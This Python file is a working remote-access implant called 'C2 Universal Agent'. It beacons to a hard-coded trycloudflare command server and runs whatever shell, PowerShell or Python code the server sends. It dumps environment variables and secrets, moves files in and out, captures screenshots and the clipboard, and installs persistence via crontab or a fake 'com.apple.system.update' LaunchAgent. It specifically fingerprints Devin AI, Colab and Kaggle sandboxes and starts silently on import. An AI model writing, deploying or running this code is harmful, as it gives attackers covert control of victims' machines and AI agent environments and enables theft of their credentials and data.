#!/usr/bin/env python3
"""C2 Universal Agent — auto-detects platform, works on Linux/macOS/Windows/Colab/Kaggle."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from urllib.error import URLError
from base64 import b64encode, b64decode

# ─── Configuration (auto-injected by server) ──────────────────────────────────
C2_URL   = os.environ.get("C2_URL",    "https://likelihood-lightweight-crossing-covering.trycloudflare.com")
AGENT_ID = os.environ.get("AGENT_ID",  str(uuid.uuid4()))
SLEEP    = int(os.environ.get("SLEEP",  "5"))
JITTER   = int(os.environ.get("JITTER", "10"))
ENC_KEY  = os.environ.get("ENC_KEY",   "")
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")

# ─── Crypto ───────────────────────────────────────────────────────────────────
def xor_crypt(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

# ─── Platform detection ───────────────────────────────────────────────────────
def detect_platform():
    # Devin AI detection
    if any([
        os.environ.get("DEVIN_SESSION_ID"),
        os.environ.get("DEVIN_WORKSPACE_ID"),
        os.path.exists("/workspace"),
        "devin" in socket.gethostname().lower() if hasattr(socket, 'gethostname') else False,
    ]):
        return "devin_ai"
    if os.environ.get("COLAB_GPU") or os.path.exists("/content/drive"):
        return "colab"
    if os.environ.get("KAGGLE_URL_BASE") or os.path.exists("/kaggle"):
        return "kaggle"
    if sys.platform == "win32":
        return "windows"
    if sys.platform == "darwin":
        return "macos"
    try:
        cg = open("/proc/1/cgroup").read()
        if any(x in cg for x in ("docker", "kubepod", "containerd", "lxc")):
            return "container"
    except Exception:
        pass
    try:
        r = subprocess.check_output("systemd-detect-virt 2>/dev/null || echo none", shell=True, timeout=3).decode().strip()
        if r not in ("none", ""):
            return "vm"
    except Exception:
        pass
    if any(x in platform.node().lower() for x in ["aws", "gcp", "azure", "ec2", "cloud"]):
        return "cloud"
    return "machine"

# ─── Network ──────────────────────────────────────────────────────────────────
def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def check_server_health(c2_url=None, timeout=5):
    """Check if C2 server is reachable and responding."""
    c2_url = c2_url or C2_URL
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
        req = Request(f"{c2_url}/api/health", headers={"User-Agent": "Mozilla/5.0"})
        resp = opener.open(req, timeout=timeout)
        data = json.loads(resp.read())
        return True, data
    except URLError as e:
        return False, f"Connection failed: {e.reason}"
    except socket.timeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, f"Error: {type(e).__name__}: {e}"

def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
    c2_url = c2_url or C2_URL
    auth_token = auth_token or AUTH_TOKEN
    enc_key = enc_key or ENC_KEY
    
    payload_str = json.dumps(data)
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if auth_token:
        headers["X-Auth-Token"] = auth_token
    if enc_key:
        body = b64encode(xor_crypt(payload_str.encode(), enc_key.encode())).decode()
        headers["X-Enc"] = "1"
        headers["Content-Type"] = "text/plain"
    else:
        body = payload_str

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))

    req = Request(f"{c2_url}{path}", data=body.encode(), headers=headers)
    resp = opener.open(req, timeout=15)
    raw = resp.read()

    if enc_key and resp.headers.get("Content-Type", "").startswith("text/plain"):
        try:
            return json.loads(xor_crypt(b64decode(raw), enc_key.encode()).decode())
        except Exception:
            pass
    return json.loads(raw)

# ─── System info ──────────────────────────────────────────────────────────────
def collect_sysinfo():
    info = {
        "cpu_count": os.cpu_count(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "python": platform.python_version(),
        "cwd": os.getcwd(),
        "user": "",
        "env_vars": list(os.environ.keys()),
    }
    try:
        info["user"] = subprocess.check_output("whoami", shell=True, timeout=5).decode().strip()
    except Exception:
        pass
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal"):
                    info["mem_total_mb"] = int(line.split()[1]) // 1024
                    break
    except Exception:
        pass
    try:
        r = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null", shell=True, timeout=5).decode().strip()
        if r:
            info["gpu"] = r
    except Exception:
        pass
    try:
        st = os.statvfs("/")
        info["disk_free_gb"] = round((st.f_bavail * st.f_frsize) / (1024 ** 3), 1)
    except Exception:
        pass
    return info

# ─── Registration ─────────────────────────────────────────────────────────────
def register(c2_url=None, agent_id=None, auth_token=None, enc_key=None):
    c2_url = c2_url or C2_URL
    agent_id = agent_id or AGENT_ID
    pt = detect_platform()
    os_name = f"macOS {platform.mac_ver()[0]}" if pt == "macos" else f"{platform.system()} {platform.release()}"
    info = {
        "id": agent_id,
        "hostname": socket.gethostname(),
        "username": subprocess.check_output("whoami 2>/dev/null || echo unknown", shell=True, timeout=5).decode().strip(),
        "os": os_name,
        "arch": platform.machine(),
        "ip_internal": get_internal_ip(),
        "platform_type": pt,
    }
    return http_post("/api/agent/register", info, c2_url, auth_token, enc_key)

# ─── Task execution ───────────────────────────────────────────────────────────
def execute_task(task):
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    result = ""

    try:
        if tt == "cmd":
            result = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

        elif tt == "powershell":
            result = subprocess.check_output(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")

        elif tt == "python":
            import io
            buf = io.StringIO()
            old_out = sys.stdout
            sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__})
                result = buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old_out

        elif tt == "sysinfo":
            result = json.dumps(collect_sysinfo(), indent=2)

        elif tt == "env":
            result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

        elif tt == "ls":
            target = payload.strip() or "."
            result = "\n".join(
                f"{'d' if os.path.isdir(os.path.join(target, x)) else '-'} {x}"
                for x in sorted(os.listdir(target))
            )

        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                result = f"Written {len(base64.b64decode(b64data))} bytes to {path}"

        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    data = f.read()
                result = f"[b64:{payload}] " + b64encode(data).decode()
            else:
                result = f"File not found: {payload}"

        elif tt == "screenshot":
            try:
                import mss, mss.tools
                with mss.mss() as sct:
                    sct.shot(output="/tmp/.c2screen.png")
                with open("/tmp/.c2screen.png", "rb") as f:
                    result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
            except ImportError:
                if sys.platform == "darwin":
                    subprocess.run(["screencapture", "-x", "/tmp/.c2screen.png"], timeout=10)
                    with open("/tmp/.c2screen.png", "rb") as f:
                        result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
                else:
                    result = "mss not installed; run: pip install mss"

        elif tt == "persist":
            plat = detect_platform()
            script = os.path.abspath(__file__)
            if plat in ("linux", "machine", "cloud", "vm", "container", "colab", "kaggle"):
                cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
                os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab -')
                result = f"Persistence added via crontab"
            elif plat == "macos":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
                content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
                os.makedirs(os.path.dirname(plist), exist_ok=True)
                open(plist, "w").write(content)
                os.system(f"launchctl load {plist} 2>/dev/null")
                result = f"LaunchAgent installed: {plist}"
            else:
                result = f"Persistence not implemented for platform: {plat}"

        elif tt == "kill":
            script = os.path.abspath(__file__)
            os.system(f'crontab -l 2>/dev/null | grep -v "{script}" | crontab - 2>/dev/null')
            os.system("launchctl remove com.apple.system.update 2>/dev/null")
            result = "Agent terminating"
            try:
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
            except Exception:
                pass
            sys.exit(0)

        elif tt == "net":
            try:
                result = subprocess.check_output(
                    "ip a 2>/dev/null || ifconfig 2>/dev/null || ipconfig 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                routes = subprocess.check_output(
                    "ip route 2>/dev/null || netstat -rn 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                result += "\n--- ROUTES ---\n" + routes
            except Exception as e:
                result = f"[net error] {e}"

        elif tt == "clipboard":
            result = subprocess.check_output(
                "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard 2>/dev/null || pbpaste 2>/dev/null || powershell -c 'Get-Clipboard' 2>/dev/null || echo 'no clipboard tool'",
                shell=True, timeout=5
            ).decode(errors="replace")

        elif tt == "ps":
            result = subprocess.check_output(
                "ps aux 2>/dev/null || tasklist 2>/dev/null",
                shell=True, timeout=10
            ).decode(errors="replace")

        else:
            result = f"Unknown task type: {tt}"

    except subprocess.TimeoutExpired:
        result = "[timeout exceeded]"
    except Exception as e:
        result = f"[error] {type(e).__name__}: {e}"

    return result[:65000] + ("\n[...truncated]" if len(result) > 65000 else "")

# ─── Beacon loop ──────────────────────────────────────────────────────────────
def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=None, jitter=None):
    import random
    _sleep = sleep or SLEEP
    _jitter = jitter or JITTER
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": agent_id or AGENT_ID}, c2_url, auth_token, enc_key)
            _sleep = int(resp.get("sleep", _sleep))
            _jitter = int(resp.get("jitter", _jitter))
            for task in resp.get("tasks", []):
                try:
                    result = execute_task(task)
                    http_post("/api/agent/result", {"task_id": task["id"], "result": result}, c2_url, auth_token, enc_key)
                except Exception as e:
                    try:
                        http_post("/api/agent/result", {"task_id": task["id"], "result": f"[agent error] {e}"}, c2_url, auth_token, enc_key)
                    except Exception:
                        pass
        except Exception:
            pass
        jitter_s = _sleep * _jitter / 100
        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))


# ─── UniversalAgent Class ─────────────────────────────────────────────────────
class UniversalAgent:
    """Universal C2 Agent - works on all platforms."""
    
    def __init__(self, c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=5, jitter=10):
        self.c2_url = c2_url or C2_URL
        self.agent_id = agent_id or str(uuid.uuid4())
        self.auth_token = auth_token
        self.enc_key = enc_key
        self.sleep = sleep
        self.jitter = jitter
        self._running = False
        self._thread = None
    
    def register(self):
        return register(self.c2_url, self.agent_id, self.auth_token, self.enc_key)
    
    def beacon(self):
        return http_post("/api/agent/beacon", {"id": self.agent_id}, self.c2_url, self.auth_token, self.enc_key)
    
    def execute(self, task):
        return execute_task(task)
    
    def start(self, block=True):
        """Start agent. If block=True, runs in foreground. If False, runs in background thread."""
        self.register()
        self._running = True
        if block:
            beacon_loop(self.c2_url, self.agent_id, self.auth_token, self.enc_key, self.sleep, self.jitter)
        else:
            self._thread = threading.Thread(
                target=beacon_loop,
                args=(self.c2_url, self.agent_id, self.auth_token, self.enc_key, self.sleep, self.jitter),
                daemon=True
            )
            self._thread.start()
    
    def stop(self):
        self._running = False


# ─── Entry point ──────────────────────────────────────────────────────────────
def main():
    """Entry point for pip-installed agent."""
    import random
    print(f"[C2 Agent] Platform: {detect_platform()}")
    print(f"[C2 Agent] C2 URL: {C2_URL}")
    print(f"[C2 Agent] Agent ID: {AGENT_ID}")
    
    # Check server health first
    print(f"[C2 Agent] Checking server connectivity...")
    ok, result = check_server_health()
    if ok:
        print(f"[C2 Agent] Server OK: {result}")
    else:
        print(f"[C2 Agent] Server check failed: {result}")
        print(f"[C2 Agent] Troubleshooting:")
        print(f"  - Is the server running? (sysmon --host 0.0.0.0 --port 5000)")
        print(f"  - Is C2_URL correct? Currently: {C2_URL}")
        print(f"  - Is the port reachable? (firewall/network)")
        print(f"  - For HTTPS: check certificate")
    
    # Register with retry and detailed error
    retry_count = 0
    while True:
        retry_count += 1
        try:
            register()
            print(f"[C2 Agent] Registered successfully: {AGENT_ID}")
            break
        except URLError as e:
            print(f"[C2 Agent] [{retry_count}] Connection error: {e.reason}")
            if "Connection refused" in str(e.reason):
                print(f"  -> Server not running or wrong port")
            elif "timed out" in str(e.reason).lower():
                print(f"  -> Network unreachable or firewall blocking")
        except socket.timeout:
            print(f"[C2 Agent] [{retry_count}] Socket timeout - server not responding")
        except Exception as e:
            print(f"[C2 Agent] [{retry_count}] Registration failed: {type(e).__name__}: {e}")
        
        if retry_count % 5 == 0:
            print(f"[C2 Agent] Still trying... (attempt {retry_count})")
        time.sleep(10)
    
    # Start beacon loop
    beacon_loop()

if __name__ == "__main__":
    main()
else:
    # Imported (Colab/Jupyter cell exec)
    register()
    threading.Thread(target=beacon_loop, daemon=True).start()
